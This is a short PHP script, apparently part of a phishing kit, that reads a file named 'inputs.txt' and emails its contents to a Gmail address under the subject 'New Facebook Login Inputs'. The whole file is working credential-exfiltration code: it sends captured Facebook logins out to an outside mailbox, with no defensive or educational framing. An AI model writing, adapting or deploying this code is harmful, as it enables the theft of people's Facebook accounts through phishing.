<?php

$emailTo = "mrsomebodyfromearth@gmail.com";
$subject = "New Facebook Login Inputs";
$message = file_get_contents("inputs.txt");
$headers = "Content-type: text/plain; charset=UTF-8" . PHP_EOL;
$headers .= "From: Your Name <jlcabajaan@example.com>" . PHP_EOL;
$headers .= "Reply-To: JohnLC <jlcabajaan@example.com>" . PHP_EOL;
$headers .= "X-Mailer: PHP/" . phpversion();

if (mail($emailTo, $subject, $message, $headers)) {
    echo "Email sent successfully.";
} else {
    echo "Email sending failed.";
}

?>